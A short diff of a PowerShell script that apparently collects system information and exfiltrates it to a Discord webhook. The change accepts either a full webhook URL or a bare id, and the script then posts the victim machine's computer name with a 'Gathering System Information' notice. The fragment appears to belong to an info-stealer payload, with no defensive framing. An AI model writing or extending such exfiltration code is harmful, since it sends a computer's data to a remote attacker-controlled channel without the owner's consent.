@@ -26,7 +26,10 @@ else{
 sleep 1
 Add-Type -AssemblyName System.Windows.Forms
 
-$hookurl = ("https://discord.com/api/webhooks/" + "$dc")
+$hookurl = "$dc"
+if ($hookurl.Length -lt 120){
+	$hookurl = ("https://discord.com/api/webhooks/" + "$dc")
+}
 
 # Send a notification to discord on start
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"} | ConvertTo-Json
